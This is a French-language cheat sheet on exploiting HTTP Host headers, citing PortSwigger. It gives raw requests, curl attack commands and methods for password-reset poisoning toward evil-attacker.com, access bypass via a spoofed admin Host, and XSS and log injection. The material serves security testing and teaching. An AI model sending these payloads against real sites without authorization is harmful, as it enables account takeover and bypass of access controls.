# HTTP Host headers

Voici une synthèse des principaux scénarios d’exploitation des **HTTP Host headers**, présentée sous forme de liste numérotée et indentée, avec des exemples complets et condensés sur une seule ligne pour les payloads, commandes d’attaque et d’analyse, ainsi qu’une méthodologie détaillée et une URL PortSwigger complète.

---

**1. Host Header Injection basique**  
  1. Payload d’attaque neutre : GET / HTTP/1.1 Host: evil-attacker.com Connection: close  
  2. Commande d’attaque : curl -H "Host: evil-attacker.com" https://site-victime.net/  
  3. Commande d’analyse : curl -H "Host: evil-attacker.com" -v https://site-victime.net/  
     Observer si la réponse contient des liens, redirections ou contenus utilisant evil-attacker.com.  
  4. Élément d’analyse détaillé : Vérifier si l’application utilise la valeur du header Host sans validation, permettant la génération de liens, redirections ou d’URL d’API malveillantes.  
  5. Méthodologie détaillée : Envoyer des requêtes HTTP en modifiant le header Host, observer la réponse pour détecter l’utilisation de la valeur injectée dans le contenu HTML, liens, redirections ou emails générés.  
  6. Source : https://portswigger.net/web-security/host-header

**2. Host Header Poisoning dans la réinitialisation de mot de passe**  
  1. Payload d’attaque neutre : POST /reset-password HTTP/1.1 Host: evil-attacker.com Content-Type: application/x-www-form-urlencoded Content-Length: 30 email=admin@site-victime.net  
  2. Commande d’attaque : curl -X POST -H "Host: evil-attacker.com" -d "email=admin@site-victime.net" https://site-victime.net/reset-password  
  3. Commande d’analyse : Consulter l’email de réinitialisation ou utiliser curl -s -H "Host: evil-attacker.com" https://site-victime.net/reset-password | grep evil-attacker.com  
     Vérifier si le lien de réinitialisation contient evil-attacker.com.  
  4. Élément d’analyse détaillé : Vérifier si le lien de réinitialisation ou d’autres liens sensibles générés par l’application utilisent la valeur du Host fourni par l’utilisateur.  
  5. Méthodologie détaillée : Faire une demande de réinitialisation en injectant une valeur Host contrôlée, puis vérifier si le lien envoyé dans l’email ou affiché à l’utilisateur contient le domaine malveillant.  
  6. Source : https://portswigger.net/web-security/host-header/exploiting

**3. Bypass de restrictions d’accès ou de filtrage par Host**  
  1. Payload d’attaque neutre : GET /admin HTTP/1.1 Host: admin.site-victime.net Connection: close  
  2. Commande d’attaque : curl -H "Host: admin.site-victime.net" https://site-victime.net/admin  
  3. Commande d’analyse : curl -H "Host: admin.site-victime.net" -v https://site-victime.net/admin  
     Observer si des pages internes ou réservées deviennent accessibles ou si le contenu diffère selon le Host.  
  4. Élément d’analyse détaillé : Vérifier si l’application ou le reverse proxy applique des règles de filtrage ou d’accès basées sur la valeur du Host.  
  5. Méthodologie détaillée : Tester différentes valeurs de Host pour contourner les contrôles d’accès ou de routage, observer si l’application délivre des contenus différents ou permet l’accès à des fonctionnalités normalement restreintes.  
  6. Source : https://portswigger.net/web-security/host-header/exploiting

**4. Host Header Injection pour XSS ou injection dans les logs**  
  1. Payload d’attaque neutre : GET / HTTP/1.1 Host: <script>alert(1)</script> Connection: close  
  2. Commande d’attaque : curl -H "Host: <script>alert(1)</script>" https://site-victime.net/  
  3. Commande d’analyse : curl -H "Host: <script>alert(1)</script>" -v https://site-victime.net/  
     Rechercher dans la réponse ou dans les logs si la valeur est réinjectée sans filtre, par exemple grep "<script>" sur la page ou les logs.  
  4. Élément d’analyse détaillé : Vérifier si la valeur du Host est réutilisée dans la page, les logs ou des emails sans échappement, permettant XSS, log injection ou phishing.  
  5. Méthodologie détaillée : Injecter des caractères spéciaux ou du code dans le Host, puis rechercher leur reflet dans la réponse HTTP, les logs du serveur ou tout autre canal.  
  6. Source : https://portswigger.net/web-security/host-header/exploiting

---
